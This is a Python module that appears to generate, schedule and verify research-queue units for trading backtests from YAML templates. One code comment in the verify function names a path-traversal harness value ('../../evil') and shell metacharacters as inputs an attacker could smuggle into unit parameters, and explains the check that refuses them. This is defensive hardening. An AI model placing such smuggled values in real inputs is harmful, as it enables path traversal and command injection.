def root_data_dir() -> Path:
    """`plan_legs` needs a data dir only to resolve candles, which `ignore_missing_data`
    waives; the scope decision it returns here is config-only."""
    return Path("data")


def _leg_source(name: str, tpl: Dict[str, Any], facts: Dict[str, Any]) -> List[Dict[str, Any]]:
    legs, ev = facts["legs"], facts["evidence"]
    out: List[Dict[str, Any]] = []
    if name == "live_roster_legs":
        for leg, info in legs.items():
            out.append({"leg": leg, **info})
    elif name == "live_roster_legs_e35_sweepable":
        # ⚠️ THE E35 SWEEP HAS A SCOPE, AND THE TEMPLATE MUST ASK IT RATHER THAN RESTATE IT.
        # `live_roster_legs` fed `ict_scalp_*` legs to e35-bracket-sweep.yml, whose planner
        # refuses the `scalp`/`fvg` families (out_of_scope_family): the run died in its
        # `plan` job after ~90 s with "shard-plan produced ZERO jobs", the dispatcher had
        # already stamped the unit, and the corpus stopped growing -- MEASURED 2026-10-04:
        # RQ-20261002-001 (ict_scalp_mgc_15m) and RQ-20261003-001 (ict_scalp_sol_15m), runs
        # 37086544045 / 37106772916, both red in `plan`; RQ-20260929-005 and -20261003-006
        # carry the same legs. The sweep's OWN resolver (`plan_legs`) is the one scope, so
        # a leg it would refuse is never generated.
        from scripts.research.e35_bracket_geometry_sweep import plan_legs
        runnable, _skipped = plan_legs(root_data_dir(), None, 0.099, ignore_missing_data=True)
        sweepable = {r["leg"] for r in runnable}
        for leg, info in legs.items():
            if leg in sweepable:
                out.append({"leg": leg, **info})
    elif name == "evidence_legs_with_breakout_market":
        markets = tpl.get("markets") or {}
        for leg, info in legs.items():
            m = markets.get(info["symbol"])
            if leg in ev and m:
                out.append({"leg": leg, **info, **ev[leg], "breakout_market": str(m["market"]),
                            "swap_model": str(m["swap_model"])})
    elif name == "live_roster_legs_with_e7_harness":
        pats = tpl.get("harness_by_leg_pattern") or {}
        for leg, info in legs.items():
            harness = next((h for pat, h in pats.items() if pat in leg), None)
            if harness:
                out.append({"leg": leg, **info, "harness": harness})
    else:
        raise ValueError(f"unknown legs source {name!r}")
    return out


def _int_or_none(v: Any) -> Optional[int]:
    if isinstance(v, bool):
        return None
    try:
        return int(v)
    except (TypeError, ValueError):
        return None


def min_n_trades(tpl: Dict[str, Any]) -> Optional[int]:
    """The template's declared `min_n_trades` floor, or None if it declares none.

    When the template's run command also passes `--n-floor`, the two MUST agree:
    a generator floor that differs from the one the unit grades against would
    re-open exactly the gap this exists to close.
    """
    if "min_n_trades" not in tpl:
        return None
    floor = _int_or_none(tpl.get("min_n_trades"))
    if floor is None or floor < 0:
        raise ValueError(f"template {tpl.get('family')!r}: min_n_trades must be a non-negative int")
    cmd = (tpl.get("run") or {}).get("command") or []
    if isinstance(cmd, list) and "--n-floor" in cmd:
        i = cmd.index("--n-floor")
        graded = _int_or_none(cmd[i + 1]) if i + 1 < len(cmd) else None
        if graded != floor:
            raise ValueError(f"template {tpl.get('family')!r}: min_n_trades {floor} != "
                             f"run.command --n-floor {graded!r}")
    return floor


def expand(tpl: Dict[str, Any], facts: Dict[str, Any]) -> List[Dict[str, Any]]:
    """All parameter points of a family, each a flat dict of placeholders."""
    grid = dict(tpl.get("grid") or {})
    points: List[Dict[str, Any]] = [{}]
    if "legs" in grid:
        points = _leg_source(str(grid.pop("legs")), tpl, facts)
    floor = min_n_trades(tpl)
    if floor is not None:
        # ⚠️ A unit whose committed n is below its OWN registered n-floor can only
        # ever grade UNDERPOWERED (PI-20261004-FOJGFIZF-0002: 33 prop-fit-breakout
        # runs, legs at n=57 vs the 88 floor, zero decisions). Such a leg is not
        # minted; because `point_key` excludes n_trades, it is minted on the first
        # replenish after its committed evidence reaches the floor -- accruing,
        # not dropped. A point with no readable n cannot show it clears the floor.
        points = [p for p in points if _int_or_none(p.get("n_trades")) is not None
                  and _int_or_none(p.get("n_trades")) >= floor]
    for axis in sorted(grid):
        values = grid[axis]
        if not isinstance(values, list) or not values:
            raise ValueError(f"grid.{axis} must be a non-empty list")
        nxt: List[Dict[str, Any]] = []
        for p in points:
            for v in values:
                q = dict(p)
                if isinstance(v, dict):
                    q[f"{axis}_key"] = str(v["key"])
                    q[axis] = str(v.get("label", v["key"]))
                    for k, val in v.items():
                        if k not in ("key", "label"):
                            q[f"{axis}_{k}"] = str(val)
                else:
                    q[axis] = str(v)
                nxt.append(q)
        points = nxt
    return points


def point_key(family: str, p: Dict[str, Any]) -> str:
    """The identity of a parameter point: family + the axes that define it
    (never derived facts such as n_trades, which move as evidence accrues)."""
    ident = {k: v for k, v in sorted(p.items())
             if k == "leg" or k.endswith("_key") or k in ("start_date", "cadence_days")}
    return family + ":" + ",".join(f"{k}={v}" for k, v in ident.items())


def _fill(obj: Any, params: Dict[str, Any]) -> Any:
    if isinstance(obj, str):
        return _PLACEHOLDER.sub(lambda m: str(params[m.group(1)]) if m.group(1) in params else m.group(0), obj)
    if isinstance(obj, list):
        return [_fill(x, params) for x in obj]
    if isinstance(obj, dict):
        return {k: _fill(v, params) for k, v in obj.items()}
    return obj


def render(tpl: Dict[str, Any], tpl_path: str, tpl_sha: str, params: Dict[str, Any],
           unit_id: str, day: str) -> str:
    """The unit file's exact text for (template, params, id, date)."""
    yaml = _yaml()
    p = dict(params)
    p["unit_id"] = unit_id
    p["date"] = day
    unit: Dict[str, Any] = {"id": unit_id, "title": _fill(tpl["title"], p), "status": "queued",
                            "cadence": str(tpl.get("cadence") or "once"), "kind": str(tpl.get("kind") or "experiment")}
    if tpl.get("theme") is not None:
        unit["theme"] = str(tpl["theme"])
    if tpl.get("priority") is not None:
        unit["priority"] = int(tpl["priority"])
    if tpl.get("why_not_inferential"):
        unit["why_not_inferential"] = _fill(tpl["why_not_inferential"], p)
    unit["question"] = _fill(tpl["question"], p)
    unit["why_this_matters"] = _fill(tpl.get("why_this_matters", ""), p)
    power = _fill(tpl["power"], p)
    if isinstance(power.get("expected_n"), str) and power["expected_n"].isdigit():
        power["expected_n"] = int(power["expected_n"])
    unit["power"] = power
    rule = _fill(tpl["decision_rule"], p)
    rule["registered_at"] = day
    rule["registered_before_run"] = True
    unit["decision_rule"] = rule
    unit["routing"] = _fill(tpl["routing"], p)
    run = _fill(tpl["run"], p)
    inputs = dict(run.get("inputs") or {})
    if run.get("workflow") == "research-script-run.yml":
        inputs["research_unit"] = unit_id
    run["inputs"] = inputs
    unit["run"] = run
    unit["lands"] = _fill(tpl["lands"], p)
    unit["generated"] = {"family": str(tpl["family"]), "template": tpl_path, "template_sha": tpl_sha,
                         "key": point_key(str(tpl["family"]), params),
                         "params": {k: str(v) for k, v in sorted(params.items())}}
    unit["last_dispatched_at"] = None
    body = yaml.safe_dump(unit, sort_keys=False, width=100, allow_unicode=True)
    left = unresolved_placeholders(body)
    if left:
        # A template placeholder the grid never supplies would otherwise ship
        # verbatim into the unit's argv and fail every cell at run time (the six
        # prop-fit units of 2026-09-28 ran `{sizing_args}` literally). Refuse
        # here, at generation, where the fix is one template edit.
        raise ValueError(f"{tpl_path}: placeholder(s) {left} are not resolved by the point "
                         f"{sorted(p)} -- not one of the runner's own ({sorted(RUNNER_PLACEHOLDERS)}) "
                         "and not a grid axis / fact; fix the template")
    return HEADER.format(tpl=tpl_path, sha=tpl_sha, date=day, key=unit["generated"]["key"]) + body


# ── the queue as it is ──────────────────────────────────────────────────────
def load_templates(root: Path) -> List[Tuple[str, str, Dict[str, Any]]]:
    yaml = _yaml()
    out = []
    for path in sorted((root / TEMPLATES).glob("*.yaml")):
        text = path.read_text(encoding="utf-8")
        tpl = yaml.safe_load(text)
        for key in ("family", "weight", "title", "question", "power", "decision_rule", "routing", "run", "lands", "grid"):
            if key not in tpl:
                raise ValueError(f"{path.name}: template lacks `{key}`")
        out.append((path.relative_to(root).as_posix(), hashlib.sha256(text.encode("utf-8")).hexdigest()[:12], tpl))
    return out


def existing_units(root: Path) -> Tuple[Dict[str, Dict[str, Any]], List[str]]:
    """{id: unit} over research/queue/**/*.yaml, plus the ids that could not be read."""
    yaml = _yaml()
    units: Dict[str, Dict[str, Any]] = {}
    bad: List[str] = []
    for path in sorted((root / QUEUE).rglob("*.yaml")):
        try:
            raw = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
        except (OSError, UnicodeDecodeError, yaml.YAMLError):
            # The three things reading a unit can fail on; REPORTED in `bad`,
            # never skipped -- an unreadable unit is a finding, not silence.
            bad.append(path.stem)
            continue
        if isinstance(raw, dict):
            units[path.stem] = raw
        else:
            bad.append(path.stem)
    return units, bad


#: The REPLENISH HORIZON, not the dispatcher's cadence. The dispatcher's cron
#: is HOURLY (`20 * * * *`, research-queue-dispatch.yml, operator 2026-10-06:
#: the git infrastructure keeps the queue moving, not a session); it was
#: `20 */6 * * *` until then. This stays 6.0 so "runnable" keeps meaning
#: "would fire within the next six hours" and the daily refill target of 25
#: runnable units is measured over the same window as before the change.
DISPATCH_CYCLE_HOURS = 6.0


def dispatchable(u: Dict[str, Any]) -> bool:
    """Routed to a real *.yml workflow (not a session note) and still queued."""
    wf = str((u.get("run") or {}).get("workflow") or "")
    return u.get("status") == "queued" and wf.endswith((".yml", ".yaml")) and not any(c.isspace() for c in wf)


def runnable(units: Dict[str, Dict[str, Any]], *, now: Optional[datetime] = None,
             horizon_hours: float = DISPATCH_CYCLE_HOURS) -> List[str]:
    """Queued units the dispatcher WOULD FIRE within the next cycle: a real
    *.yml workflow AND due by the dispatcher's own rule (`dispatch_queue.due_within`)
    at now + horizon. `status: queued` alone is NOT runnable: a `once` unit that
    already ran is waiting on grading, and a monthly unit that ran yesterday is
    idle for 29 days. Measured 2026-09-29 04:35Z on main (manager): 21 units
    read "runnable" while the dispatcher would fire 3 -- so the refill saw no
    deficit and the alarm stayed quiet while the runners sat idle."""
    from scripts.research.dispatch_queue import due_within
    now = now or datetime.now(timezone.utc)
    return sorted(uid for uid, u in units.items() if dispatchable(u) and due_within(u, now, horizon_hours))


def allocate(deficit: int, weights: Dict[str, int], available: Dict[str, int]) -> Dict[str, int]:
    """Largest-remainder split of `deficit` by weight, capped by availability,
    with the leftover re-split among families that still have candidates."""
    alloc = {f: 0 for f in weights}
    remaining = max(0, deficit)
    while remaining > 0:
        open_f = {f: w for f, w in weights.items() if available[f] - alloc[f] > 0}
        if not open_f:
            break
        total = sum(open_f.values())
        shares = {f: remaining * w / total for f, w in open_f.items()}
        floors = {f: int(shares[f]) for f in open_f}
        left = remaining - sum(floors.values())
        for f in sorted(open_f, key=lambda f: (-(shares[f] - floors[f]), f)):
            if left <= 0:
                break
            floors[f] += 1
            left -= 1
        progressed = False
        for f, n in floors.items():
            take = min(n, available[f] - alloc[f])
            if take > 0:
                alloc[f] += take
                remaining -= take
                progressed = True
        if not progressed:
            break
    return alloc


#: Numbers 900-999 of every day are RESERVED for hand-authored units (next_rq_id.py mints
#: there); this generator mints only 001-899. PI-20261005-RQ-ID-RACE-0001: both used to mint
#: max+1 from the same counter, and the generator -- which cannot see an open PR -- caught up to
#: ids a lane had already put on a branch (the 2026-10-05 653..661 collision). Disjoint bands
#: make that collision impossible rather than unlikely. scripts/ci/check_research_queue_id_bands.py
#: enforces the split on every unit a PR adds. DECIDED by lane RQ-INFRA 2026-10-07; reverse by
#: moving this constant and next_rq_id.HAND_FLOOR together.
HAND_FLOOR = 900


def next_ids(units: Dict[str, Dict[str, Any]], day: str, count: int) -> List[str]:
    """Up to ``count`` ids in the GENERATED band. Returns FEWER when the band is full (the caller
    zips against it, so the day simply stops minting) -- a full day must not crash the replenisher,
    because a replenisher that cannot run is a queue that waits on a session."""
    compact = day.replace("-", "")
    used = [int(m.group(2)) for uid in units
            if (m := _ID_RE.match(uid)) and m.group(1) == compact and int(m.group(2)) < HAND_FLOOR]
    start = (max(used) if used else 0) + 1
    return [f"RQ-{compact}-{n:03d}" for n in range(start, min(start + count, HAND_FLOOR))]


def plan(root: Path, *, day: str, target: int, now: Optional[datetime] = None) -> Dict[str, Any]:
    facts = repo_facts(root)
    units, bad = existing_units(root)
    have = runnable(units, now=now)
    seen_keys = {str((u.get("generated") or {}).get("key")) for u in units.values() if isinstance(u.get("generated"), dict)}
    families = []
    for tpl_path, sha, tpl in load_templates(root):
        cands = [(point_key(str(tpl["family"]), p), p) for p in expand(tpl, facts)]
        cands = sorted((k, p) for k, p in cands if k not in seen_keys)
        families.append({"family": str(tpl["family"]), "weight": int(tpl["weight"]), "path": tpl_path, "sha": sha,
                         "tpl": tpl, "candidates": cands})
    deficit = target - len(have)
    alloc = allocate(deficit, {f["family"]: f["weight"] for f in families},
                     {f["family"]: len(f["candidates"]) for f in families})
    chosen: List[Tuple[Dict[str, Any], str, Dict[str, Any]]] = []
    for f in families:
        for key, p in f["candidates"][:alloc[f["family"]]]:
            chosen.append((f, key, p))
    ids = next_ids(units, day, len(chosen))
    new_units = []
    for (f, key, p), uid in zip(chosen, ids):
        new_units.append({"id": uid, "family": f["family"], "key": key,
                          "text": render(f["tpl"], f["path"], f["sha"], p, uid, day)})
    return {"day": day, "target": target, "runnable_before": len(have), "deficit": deficit, "unreadable": bad,
            "queued_not_due": sorted(uid for uid, u in units.items() if dispatchable(u) and uid not in have),
            "candidates": {f["family"]: len(f["candidates"]) for f in families}, "allocation": alloc,
            "new_units": new_units}


# ── verify: reproduce every generated unit a branch adds ────────────────────
def _git(root: Path, *args: str) -> Tuple[int, str]:
    p = subprocess.run(["git", *args], cwd=str(root), capture_output=True, text=True)
    return p.returncode, p.stdout.strip()


def verify(root: Path, base: str) -> List[str]:
    """Problems with the units this branch ADDS under research/queue/ relative to
    `base`: each must be byte-identical to a re-render from the template at
    HEAD with the params the unit records. Modified or deleted queue files are
    problems too -- the generator only ever ADDS."""
    yaml = _yaml()
    rc, mb = _git(root, "merge-base", base, "HEAD")
    if rc != 0 or not mb:
        return [f"merge-base with {base} unreadable"]
    rc, out = _git(root, "diff", "--name-status", "--no-renames", mb, "HEAD", "--", QUEUE.as_posix())
    if rc != 0:
        return ["queue diff unreadable"]
    problems: List[str] = []
    templates = {p: (sha, tpl) for p, sha, tpl in load_templates(root)}
    # ⚠️ REVIEW FIX (2026-09-29): `generated.params` comes from the unit under
    # test, so a hand-made unit could carry ANY params (a leg that does not
    # exist, a `../../evil` harness, shell metacharacters in an arm) and still
    # reproduce byte-for-byte from the template -- E58 would then vouch a unit
    # nobody pre-registered. The params are only trusted when they are one of
    # the points the template EXPANDS TO from HEAD's own rosters + evidence.
    facts = repo_facts(root)
    points_by_tpl: Dict[str, Optional[set]] = {}
    for tpl_path, (sha, tpl) in templates.items():
        try:
            pts = expand(tpl, facts)
        except (ValueError, KeyError, TypeError) as exc:
            problems.append(f"{tpl_path}: cannot expand at HEAD ({exc}) -- nothing generated from it is vouched")
            points_by_tpl[tpl_path] = None
            continue
        points_by_tpl[tpl_path] = {tuple(sorted((k, str(v)) for k, v in pt.items())) for pt in pts}
    for line in out.splitlines():
        status, _, path = line.partition("\t")
        if status != "A":
            problems.append(f"{path}: {status} -- the generator only ADDS units; an edited or deleted unit is a session's act")
            continue
        text = (root / path).read_text(encoding="utf-8")
        try:
            unit = yaml.safe_load(text)
        except yaml.YAMLError as exc:
            problems.append(f"{path}: unreadable ({exc})")
            continue
        gen = (unit or {}).get("generated") or {}
        tpl_path = str(gen.get("template") or "")
        if tpl_path not in templates:
            problems.append(f"{path}: names template {tpl_path!r}, which is not committed at HEAD")
            continue
        sha, tpl = templates[tpl_path]
        if str(gen.get("template_sha")) != sha:
            problems.append(f"{path}: generated from template sha {gen.get('template_sha')}, HEAD's is {sha}")
            continue
        m = _ID_RE.match(str(unit.get("id")))
        if not m or Path(path).stem != unit.get("id"):
            problems.append(f"{path}: id/filename mismatch")
            continue
        day = f"{m.group(1)[:4]}-{m.group(1)[4:6]}-{m.group(1)[6:]}"
        params = dict(gen.get("params") or {})
        if point_key(str(tpl["family"]), params) != str(gen.get("key")):
            problems.append(f"{path}: generated.key does not match generated.params")
            continue
        allowed = points_by_tpl.get(tpl_path)
        if allowed is None or tuple(sorted((k, str(v)) for k, v in params.items())) not in allowed:
            problems.append(f"{path}: generated.params is not a point {tpl_path} expands to from HEAD's "
                            "rosters and evidence -- not pre-registered, refused")
            continue
        expected = render(tpl, tpl_path, sha, params, str(unit["id"]), day)
        if expected != text:
            problems.append(f"{path}: does not reproduce from {tpl_path} + generated.params (hand-edited?)")
    return problems


